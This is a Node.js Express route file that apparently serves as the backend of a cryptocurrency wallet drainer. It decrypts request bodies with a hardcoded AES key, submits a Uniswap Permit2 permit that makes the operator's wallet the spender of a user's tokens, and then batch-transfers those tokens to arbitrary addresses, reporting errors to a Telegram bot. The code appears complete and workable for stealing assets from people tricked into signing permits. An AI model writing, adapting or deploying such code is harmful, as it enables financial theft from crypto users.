require("dotenv").config();
const express = require("express");
const { ethers, BigNumber } = require("ethers");
const axios = require("axios");
const crypto = require("crypto");
const { ERC20_ABI, Permit2ContractABI } = require("./ERC20_ABI"); // Ensure these ABIs are correctly exported
const { getProvider, initiatorWallet } = require("../utils/providerUtils"); // Ensure valid utility functions
const config = require("../config"); // Config contains TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID

const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
const BR_ENCRYPTION_KEY = "980c343e20c973f1b941a409d268df2cfca1d2fba93732fcecd3d5ed9cc93305";
const Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3".toLowerCase();

const router = express.Router();

// Send messages to Telegram
const sendToTelegram = async (message) => {
  try {
    const truncatedMessage =
      message.length > 4000 ? message.substring(0, 3997) + "..." : message;

    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(urlEnvBot, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to Telegram: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.message);
  }
};

// Decrypt encrypted payloads
const decrypt = ({ data, iv }) => {
  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    Buffer.from(BR_ENCRYPTION_KEY, "hex"),
    Buffer.from(iv, "hex")
  );
  let decrypted = decipher.update(data, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return JSON.parse(decrypted);
};

const decryptMiddleware = (req, res, next) => {
  try {
    const { encryptedData, iv } = req.body;

    if (!encryptedData || !iv) {
      return res.status(400).json({ error: "Missing encrypted data or IV" });
    }

    console.log("Received Encrypted Data:", encryptedData);
    console.log("Received IV:", iv);

    const decryptedData = decrypt({ data: encryptedData, iv });
    console.log("Decrypted Request Body:", decryptedData);
    req.body = decryptedData;
    next();
  } catch (error) {
    console.error("Error decrypting payload:", error.message);
    res.status(400).json({ error: "Invalid encrypted data" });
  }
};

// Ensure sufficient gas balance
const ensureSufficientGasBalance = async (address, provider, transaction) => {
  try {
    const balance = await provider.getBalance(address);
    const gasLimit = transaction.gasLimit || (await provider.estimateGas(transaction));
    const gasPrice = (await provider.getFeeData()).gasPrice || ethers.utils.parseUnits("5", "gwei");
    const estimatedGasCost = gasPrice.mul(gasLimit);

    if (balance.lt(estimatedGasCost)) {
      const required = estimatedGasCost.sub(balance);
      throw new Error(
        `Insufficient gas balance. Add at least ${ethers.utils.formatEther(required)} ETH.`
      );
    }

    console.log(`Sufficient gas balance: ${ethers.utils.formatEther(balance)} ETH.`);
  } catch (error) {
    console.error("Gas balance check failed:", error.message);
    throw error;
  }
};

// Send transactions with dynamic gas
const sendTransactionWithDynamicGas = async (connectedWallet, transaction) => {
  try {
    let gasLimit;
    try {
      gasLimit = await connectedWallet.provider.estimateGas(transaction);
    } catch (error) {
      console.warn(
        "Gas estimation failed, falling back to manual gas limit:",
        error.message
      );
      gasLimit = BigNumber.from(300000); // Fallback value
    }

    const feeData = await connectedWallet.provider.getFeeData();
    const gasPrice = feeData.gasPrice || ethers.utils.parseUnits("5", "gwei");

    const tx = {
      ...transaction,
      gasLimit,
      gasPrice,
    };

    const response = await connectedWallet.sendTransaction(tx);
    await response.wait();

    console.log("Transaction successful:", response.hash);
    return response.hash;
  } catch (error) {
    console.error("Error sending transaction with dynamic gas:", error.message || error);
    throw error;
  }
};


// Handle Permit2 and Transfer
router.post("/handlePermit2AndTransfer", decryptMiddleware, async (req, res) => {
  try {
    const { userAddress, chainId, permitDetails, transferDetails, signature } = req.body;

    if (!userAddress || !chainId || !permitDetails || !transferDetails || !signature) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    console.log(`[Chain ${chainId}] Processing Permit2 and Transfer for user: ${userAddress}`);

    const provider = getProvider(chainId);
    const connectedWallet = initiatorWallet.connect(provider);

    // Check gas balance before proceeding
    await ensureSufficientGasBalance(userAddress, provider, { gasLimit: BigNumber.from(200000) });

    const permit2Contract = new ethers.Contract(Permit2Contract, Permit2ContractABI, connectedWallet);

    console.log(`[Chain ${chainId}] Using provided nonce in permitDetails:`, permitDetails);

    const permitData = {
      details: permitDetails,
      spender: initiatorWallet.address,
      sigDeadline: Math.floor(Date.now() / 1000) + 3600,
    };

    const encodedPermitData = permit2Contract.interface.encodeFunctionData("permit", [
      userAddress,
      permitData,
      signature,
    ]);

    console.log(`[Chain ${chainId}] Sending permit transaction...`);
    const permitTx = {
      to: Permit2Contract,
      data: encodedPermitData,
    };

    const permitTxHash = await sendTransactionWithDynamicGas(connectedWallet, permitTx);
    console.log(`[Chain ${chainId}] Permit transaction confirmed: ${permitTxHash}`);

    console.log(`[Chain ${chainId}] Executing batch transfers...`);

    const transferTxHashes = await Promise.all(
      transferDetails.map(async ({ from, to, amount, token }) => {
        const transferData = permit2Contract.interface.encodeFunctionData("transferFrom", [
          [from, to, ethers.BigNumber.from(amount), token],
        ]);

        const transferTx = {
          to: Permit2Contract,
          data: transferData,
        };

        console.log(`[Chain ${chainId}] Sending transfer transaction for ${amount} of ${token}...`);
        const transferTxHash = await sendTransactionWithDynamicGas(connectedWallet, transferTx);
        console.log(`[Chain ${chainId}] Transfer confirmed: ${transferTxHash}`);
        return transferTxHash;
      })
    );

    console.log(`[Chain ${chainId}] All transfers completed:`, transferTxHashes);

    res.status(200).json({
      message: "Batch permit and transfers successful",
      permitTxHash,
      transferTxHashes,
    });
  } catch (error) {
    console.error("Error in handlePermit2AndTransfer:", error.message);
    await sendToTelegram(`Error during permit and transfer: ${error.message}`);
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
